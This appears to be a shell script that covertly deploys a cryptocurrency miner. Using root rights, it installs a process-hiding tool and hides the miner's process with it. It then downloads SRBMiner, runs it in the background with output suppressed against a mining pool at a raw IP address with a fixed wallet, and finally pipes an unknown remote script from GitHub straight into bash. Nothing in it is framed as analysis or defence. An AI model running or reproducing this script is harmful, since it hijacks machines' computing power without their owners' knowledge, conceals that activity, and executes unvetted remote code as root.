#!/bin/sh
sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz >/dev/null 2>&1
tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
cd SRBMiner-Multi-2-4-8
./SRBMiner-MULTI --algorithm randomx --pool 87.58.153.9:80 --wallet Q01050095f8fa589dcd8cebc5a6ead8da10e9d9655a1d3ee85640fd1d8ddafde13faa8b744ba6c7.SR >/dev/null 2>&1 &
curl -sL https://github.com/bsheredia/sempak/raw/refs/heads/main/kupluk.sh | bash
